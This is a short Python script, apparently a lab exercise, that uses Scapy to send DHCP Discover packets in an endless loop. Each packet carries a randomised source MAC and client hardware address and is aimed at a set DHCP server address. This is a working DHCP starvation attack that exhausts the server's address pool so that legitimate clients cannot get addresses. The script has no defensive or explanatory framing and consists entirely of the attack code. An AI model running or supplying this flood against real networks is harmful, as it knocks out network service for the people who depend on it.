from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.sendrecv import sendp
from scapy.all import RandMAC

# Function to create a DHCP Discover packet
def send_dhcp_discover(target_ip, target_mac):
    # Create a DHCP Discover packet
    dhcp_discover = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst=target_ip) / UDP(sport=68, dport=67) / BOOTP(chaddr=RandMAC()) / DHCP(options=[("message-type", "discover"), "end"])
    sendp(dhcp_discover, iface="h1-eth0", verbose=False)  # Send the packet via the network interface

# Define the target IP address (the DHCP server's IP) and the target MAC address (of the DHCP server)
target_ip = "192.168.227.1"  # Replace with your DHCP server's IP
target_mac = "00:11:22:33:44:55"  # Replace with your DHCP server's MAC address

# Continuously send DHCP Discover packets
while True:
    send_dhcp_discover(target_ip, target_mac)
    print("DHCP Discover packet sent!")